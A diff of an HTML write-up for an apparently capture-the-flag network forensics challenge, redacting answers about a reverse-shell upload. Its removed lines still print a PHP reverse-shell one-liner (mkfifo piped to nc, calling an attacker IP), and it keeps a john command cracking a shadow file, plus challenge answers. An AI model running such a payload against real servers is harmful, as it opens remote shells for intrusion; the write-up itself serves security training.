@@ -117,23 +117,27 @@
 
                     <h3>What was the URL of the page they used to upload a reverse shell?</h3>
 
-                    <p>Opening the network packet dump in wireshark, you can see that the computer with the IP address 192.168.170.145 sent a GET request to the /development/ directory.</p>
-                    
+                    <p>Opening the network packet dump in wireshark, you can see that the computer with the IP address 192.168.170.145 sent a GET request to the /d*********t/ directory.</p>
+                    										  
                     <a href="../img/post14/image2.png">
                         <img class="img-responsive" src="../img/post14/image2.png" alt="">
                     </a>
 
-                    <pre><code>/development/</code></pre>
+                    <pre><code>/d*********t/</code></pre>
+
 
                     <h3>What payload did the attacker use to gain access?</h3>
 
-                    <p>I also noticed that the computer with the IP address 192.168.170.145 uploaded the file using      <b>/development/upload.php</b> after sending the POST request. If you look at TCP Stream, you can see what malicious code was uploaded by the attacker to the server.</p>
+                    <p>I also noticed that the computer with the IP address 192.168.170.145 uploaded the file using      <b>/d*********t/upload.php</b> after sending the POST request. If you look at TCP Stream, you can see what malicious code was uploaded by the attacker to the server.</p>
 
                     <a href="../img/post14/image3.png">
                         <img class="img-responsive" src="../img/post14/image3.png" alt="">
                     </a>
 
-					<pre><code>&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?></code></pre>
+					<pre><code>&lt;?php exec("********************************************************************************/f")?></code></pre>
+
+
+
 
                     <h3>What password did the attacker use to privesc?</h3>
 
@@ -172,7 +176,7 @@
 
                     <pre><code>john --wordlist=/usr/share/wordlists/fasttrack.txt shadow-file</code></pre>
                     <pre><code>john --show shadow-file</code></pre>
-                    <pre><code>answer: 4</code></pre>
+                   
 
                     <h2 class="section-heading">Research - Analyse the code</h2>
                     
